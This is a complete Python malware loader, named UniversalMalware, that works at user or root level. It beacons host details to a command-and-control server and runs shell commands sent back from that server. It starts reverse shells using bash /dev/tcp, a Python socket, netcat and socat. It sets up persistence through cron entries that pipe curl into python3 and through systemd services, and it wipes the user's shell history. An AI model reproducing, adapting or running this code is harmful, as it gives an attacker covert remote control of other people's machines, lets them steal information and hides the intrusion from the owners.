#!/usr/bin/env python3
"""
UNIVERSAL LOADER - Works for both User and Root Level
"""

import os
import sys
import requests
import subprocess
import time
import threading
import socket
import platform

class UniversalMalware:
    def __init__(self):
        self.c2_server = "192.168.1.167"
        self.c2_port = "8000"
        self.rev_port = "4444"
        self.is_root = os.geteuid() == 0  # Check if root
        
    def get_system_info(self):
        """Collect comprehensive system information"""
        try:
            info = {
                'hostname': socket.gethostname(),
                'user': os.getenv('USER', 'unknown'),
                'home': os.getenv('HOME', 'unknown'),
                'is_root': self.is_root,
                'platform': platform.platform(),
                'machine': platform.machine(),
                'processor': platform.processor()
            }
            return info
        except Exception as e:
            return {'error': str(e)}
    
    def start_reverse_shell(self):
        """Start reverse shell with multiple fallback methods"""
        methods = [
            # Method 1: Bash reverse shell
            f"bash -i >& /dev/tcp/{self.c2_server}/{self.rev_port} 0>&1 &",
            
            # Method 2: Python reverse shell
            f'''python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.c2_server}',{self.rev_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" &''',
            
            # Method 3: Netcat (if available)
            f"nc -e /bin/bash {self.c2_server} {self.rev_port} &",
            
            # Method 4: Socat (if available)
            f"socat TCP:{self.c2_server}:{self.rev_port} EXEC:/bin/bash &"
        ]
        
        for method in methods:
            try:
                subprocess.Popen(
                    ["/bin/bash", "-c", method],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )
                print(f"[✅] Reverse shell started: {method.split()[0]}")
                break
            except Exception as e:
                continue
    
    def beacon_to_c2(self):
        """Send beacon to C2 server with system info"""
        def beacon_loop():
            while True:
                try:
                    system_info = self.get_system_info()
                    response = requests.post(
                        f"http://{self.c2_server}:{self.c2_port}/beacon",
                        json=system_info,
                        timeout=10
                    )
                    
                    # Check for commands from C2
                    if response.status_code == 200 and response.text.strip():
                        self.execute_command(response.text)
                        
                except Exception as e:
                    # Silent fail - will retry
                    pass
                
                time.sleep(60)  # Beacon every minute
        
        threading.Thread(target=beacon_loop, daemon=True).start()
    
    def execute_command(self, command):
        """Execute command from C2 server"""
        try:
            if command.startswith("CMD:"):
                cmd = command[4:]
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                output = result.stdout + result.stderr
                
                # Send output back to C2
                requests.post(
                    f"http://{self.c2_server}:{self.c2_port}/output",
                    json={'output': output, 'command': cmd},
                    timeout=10
                )
        except Exception:
            pass
    
    def ensure_persistence(self):
        """Ensure all persistence mechanisms are active"""
        def persistence_loop():
            while True:
                try:
                    if self.is_root:
                        self.check_root_persistence()
                    else:
                        self.check_user_persistence()
                except Exception:
                    pass
                
                time.sleep(300)  # Check every 5 minutes
        
        threading.Thread(target=persistence_loop, daemon=True).start()
    
    def check_root_persistence(self):
        """Check and repair root-level persistence"""
        checks = [
            # Check systemd service
            "systemctl is-active system-network.service >/dev/null 2>&1 || systemctl start system-network.service",
            
            # Check cron
            "crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
            
            # Direct restart if needed
            "curl -s http://192.168.1.167:8000/loader.py | python3 - &"
        ]
        
        for check in checks:
            try:
                subprocess.run(check, shell=True, 
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             timeout=10)
            except Exception:
                pass
    
    def check_user_persistence(self):
        """Check and repair user-level persistence"""
        checks = [
            # Check user cron
            "crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
            
            # Check user systemd
            "systemctl --user is-active user-monitor.service >/dev/null 2>&1 || systemctl --user start user-monitor.service 2>/dev/null || true",
            
            # Direct restart
            "curl -s http://192.168.1.167:8000/loader.py | python3 - &"
        ]
        
        for check in checks:
            try:
                subprocess.run(check, shell=True,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             timeout=10)
            except Exception:
                pass
    
    def self_protect(self):
        """Basic self-protection measures"""
        def protection_loop():
            while True:
                try:
                    # Remove temporary files
                    if os.path.exists("/tmp/.deployment_success"):
                        os.remove("/tmp/.deployment_success")
                    
                    # Clear command history
                    if os.path.exists(os.path.expanduser("~/.bash_history")):
                        open(os.path.expanduser("~/.bash_history"), 'w').close()
                        
                except Exception:
                    pass
                
                time.sleep(120)  # Run every 2 minutes
        
        threading.Thread(target=protection_loop, daemon=True).start()
    
    def run(self):
        """Main execution loop"""
        print("[🎯] UNIVERSAL LOADER STARTED")
        print(f"[👤] Running as: {'ROOT' if self.is_root else 'USER'}")
        print(f"[🏠] Home directory: {os.getenv('HOME', 'unknown')}")
        
        # Start all components
        self.beacon_to_c2()
        self.start_reverse_shell()
        self.ensure_persistence()
        self.self_protect()
        
        print("[✅] All components activated")
        print("[🔒] Persistence mechanisms active")
        print("[📡] Beaconing to C2 server")
        print("[🐚] Reverse shell started")
        
        # Keep alive
        while True:
            time.sleep(60)

if __name__ == "__main__":
    malware = UniversalMalware()
    malware.run()
